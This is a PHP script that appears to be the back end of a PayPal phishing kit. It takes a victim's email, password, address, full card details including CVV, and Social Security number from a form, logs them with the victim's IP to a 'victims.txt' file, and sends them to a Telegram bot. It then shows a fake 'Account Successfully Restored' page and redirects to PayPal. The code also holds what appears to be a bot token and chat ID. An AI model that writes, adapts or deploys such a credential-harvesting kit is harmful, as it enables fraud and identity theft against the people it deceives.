<?php
// Simple working version - no complications

// Get all data
$email = $_POST['email'] ?? 'N/A';
$password = $_POST['password'] ?? 'N/A';
$country = $_POST['country'] ?? 'N/A';
$fullname = $_POST['fullname'] ?? 'N/A';
$address = $_POST['address'] ?? 'N/A';
$cc_number = str_replace(' ', '', $_POST['cc_number'] ?? 'N/A');
$cc_month = $_POST['cc_month'] ?? 'N/A';
$cc_year = $_POST['cc_year'] ?? 'N/A';
$cc_cvv = $_POST['cc_cvv'] ?? 'N/A';
$cardholder = $_POST['cardholder'] ?? 'N/A';
$ssn = $_POST['ssn'] ?? 'N/A';

// Get IP
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';

// Format message
$message = "========== PAYPAL VICTIM ==========\n";
$message .= "Time: " . date('Y-m-d H:i:s') . "\n";
$message .= "IP: $ip\n";
$message .= "Email: $email\n";
$message .= "Password: $password\n";
$message .= "Name: $fullname\n";
$message .= "Country: $country\n";
$message .= "Address: $address\n";
$message .= "Card: $cc_number\n";
$message .= "Exp: $cc_month/$cc_year\n";
$message .= "CVV: $cc_cvv\n";
$message .= "Cardholder: $cardholder\n";
$message .= "SSN: $ssn\n";
$message .= "==================================\n\n";

// Save to file
file_put_contents('victims.txt', $message, FILE_APPEND);

// Telegram - replace with your info
$bot_token = 'YOUR_BOT_TOKEN';
$chat_id = 'YOUR_CHAT_ID';

if ($bot_token != '8518986165:AAH6RlmdDoB5DMuZT6F2MUnu21K_1k1rcQo' && $chat_id != '8300466523') {
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $data = ['chat_id' => $chat_id, 'text' => $message];
    // Send to Telegram (you'll replace these later)

    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    @file_get_contents($url, false, stream_context_create($options));
}

// Success page
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Account Restored</title>
    <meta http-equiv="refresh" content="3;url=https://www.paypal.com">
    <style>
        body {
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
        }
        .box {
            background: white;
            padding: 40px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h2 {
            color: #34a853;
            margin-bottom: 15px;
        }
        p {
            color: #666;
        }
    </style>
</head>
<body>
    <div class="box">
        <h2>✓ Account Successfully Restored</h2>
        <p>Redirecting to PayPal...</p>
    </div>
</body>
</html>
<?php exit(); ?>
